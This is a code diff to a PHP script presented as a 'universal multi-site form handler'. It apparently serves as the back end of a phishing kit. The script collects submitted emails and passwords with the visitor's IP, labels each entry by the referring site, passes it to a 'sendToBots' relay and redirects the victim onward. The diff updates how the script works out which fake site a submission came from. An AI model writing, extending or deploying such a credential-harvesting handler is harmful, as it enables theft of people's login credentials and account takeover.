@@ -1,6 +1,7 @@
 <?php
 // =========================================
 // 🌐 UNIVERSAL MULTI-SITE FORM HANDLER
+// ✅ Using HTTP_REFERER to detect form source domain
 // =========================================
 
 include 'firewall.php';
@@ -56,11 +57,15 @@ function sendToBots($message, $bots) {
 
 // === Main Logic ===
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    // Use HTTP_REFERER to determine where the form was hosted
+    $referer = $_SERVER['HTTP_REFERER'] ?? '';
+    $parsed  = parse_url($referer);
+    $domain  = $parsed['host'] ?? 'unknown-origin';
+
     $useremail    = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
     $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
     $ip           = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
     $timestamp    = date("Y-m-d H:i:s");
-    $domain       = $_SERVER['HTTP_HOST'];
 
     $msg = "📝 *New Submission from $domain*\n\n".
            "👤 *Email:* $useremail\n".
@@ -76,9 +81,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         header("Location: " . $site_config['redirect']);
         exit;
     } else {
-        logToFile("❌ Unrecognized domain: $domain", $log_file);
-        echo "Unauthorized domain: " . $_SERVER['HTTP_HOST'];
-        exit;
+        logToFile("❌ Unauthorized domain: $domain", $log_file);
+        exit("Unauthorized domain");
     }
 }
 ?>
